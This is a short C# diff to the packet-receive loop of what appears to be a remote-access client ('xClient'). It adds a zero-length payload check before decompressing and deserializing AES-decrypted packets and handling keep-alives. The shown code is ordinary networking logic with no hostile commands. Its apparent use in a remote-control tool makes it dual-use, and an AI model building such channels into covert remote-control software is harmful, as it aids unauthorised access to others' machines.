@@ -162,7 +162,7 @@ namespace xClient.Core
                 if (_receiveState == ReceiveType.Header)
                 {
                     process = _readableDataLen >= HEADER_SIZE;
-                    if (_readableDataLen >= HEADER_SIZE)
+                    if (process)
                     {
                         _payloadLen = BitConverter.ToInt32(_buffer, _readOffset);
 
@@ -174,7 +174,7 @@ namespace xClient.Core
                 else if (_receiveState == ReceiveType.Payload)
                 {
                     process = _readableDataLen >= _payloadLen;
-                    if (_readableDataLen >= _payloadLen)
+                    if (process)
                     {
                         byte[] payload = new byte[_payloadLen];
                         Array.Copy(this._buffer, _readOffset, payload, 0, payload.Length);
@@ -182,19 +182,23 @@ namespace xClient.Core
                         if (encryptionEnabled)
                             payload = AES.Decrypt(payload, Encoding.UTF8.GetBytes(Settings.PASSWORD));
 
-                        if (compressionEnabled)
-                            payload = new SafeQuickLZ().Decompress(payload, 0, payload.Length);
-
-                        using (MemoryStream deserialized = new MemoryStream(payload))
+                        if (payload.Length > 0)
                         {
-                            IPacket packet = Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized, PrefixStyle.Fixed32);
+                            if (compressionEnabled)
+                                payload = new SafeQuickLZ().Decompress(payload, 0, payload.Length);
 
-                            if (packet.GetType() == typeof(KeepAlive))
-                                new KeepAliveResponse() { TimeSent = ((KeepAlive)packet).TimeSent }.Execute(this);
-                            else if (packet.GetType() == typeof(KeepAliveResponse))
-                                HandleKeepAlivePacket((KeepAliveResponse)packet, this);
-                            else
-                                OnClientRead(packet);
+                            using (MemoryStream deserialized = new MemoryStream(payload))
+                            {
+                                IPacket packet = Serializer.DeserializeWithLengthPrefix<IPacket>(deserialized,
+                                    PrefixStyle.Fixed32);
+
+                                if (packet.GetType() == typeof (KeepAlive))
+                                    new KeepAliveResponse() {TimeSent = ((KeepAlive) packet).TimeSent}.Execute(this);
+                                else if (packet.GetType() == typeof (KeepAliveResponse))
+                                    HandleKeepAlivePacket((KeepAliveResponse) packet, this);
+                                else
+                                    OnClientRead(packet);
+                            }
                         }
 
                         _readOffset += _payloadLen;
